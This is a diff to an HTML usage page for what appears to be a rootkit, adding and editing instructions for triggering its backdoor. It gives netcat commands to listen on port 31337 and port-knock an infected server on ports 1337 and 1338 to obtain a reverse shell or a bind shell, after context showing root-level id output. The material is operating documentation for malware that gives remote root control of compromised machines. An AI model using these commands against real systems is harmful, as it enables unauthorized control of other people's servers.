@@ -51,7 +51,7 @@ uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plug
 <p>
 <b>Activating Reverse Shell</b>
 <br>
-To activate reverse shell, you need to set up a port listener using netcat on port 31337, the do port knocking to your target server (with rootkit installed) on port 1337.
+To activate reverse shell, you need to set up a port listener using netcat on port 31337, then do port knocking to your target server (with rootkit installed) on port 1337.
 <br>
 On your machine, open terminal and type:
 <br>
@@ -60,7 +60,22 @@ nc -l -p 31337 -v
 </pre>  
 Open another terminal tab and do port knocking to target server :
 <pre>
-nc <server ip> 1337
+nc server ip 1337
 </pre>  
-  
+Wait a few seconds and you will get reverse shell port connection from your target server   
 </p>
+
+<b>Activating Bind Shell</b>
+<br>
+To activate bind shell, you need to do port knocking to your target server (with rootkit installed) on port 1338.
+<br>
+On your machine, open terminal and type:
+<pre>
+nc server ip 1338
+</pre>  
+Wait a few seconds then type:
+<pre>
+nc server ip 31337
+</pre>
+</p>
+
